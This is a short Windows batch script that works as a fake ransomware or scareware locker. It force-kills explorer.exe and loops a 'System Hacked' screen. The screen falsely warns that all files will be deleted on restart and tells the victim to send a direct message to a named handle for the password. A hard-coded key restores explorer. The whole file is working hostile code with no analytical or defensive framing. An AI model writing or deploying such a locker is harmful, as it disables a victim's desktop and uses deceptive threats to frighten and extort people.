color 0A
@echo off 
title System Hacked
taskkill /f /im explorer.exe 
:bucle 
cls               
echo * ATTENTION
echo * If you restart your computer all your files will be deleted.
echo * Write a DM to Jowi23#7618
echo * Then you'll maybe get the password.
echo * Good luck
echo * Enter Password In the bottom of the message.
echo =============================================
echo You've been hacked, please enter the key that the owner gave to you.
echo =============================================
echo If it's correct the hack will be stopped.
echo =============================================
set /p pass=Key Here: 
if %pass%==2317 (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Congrats! Giving all the files back...
start explorer.exe 
pause
exit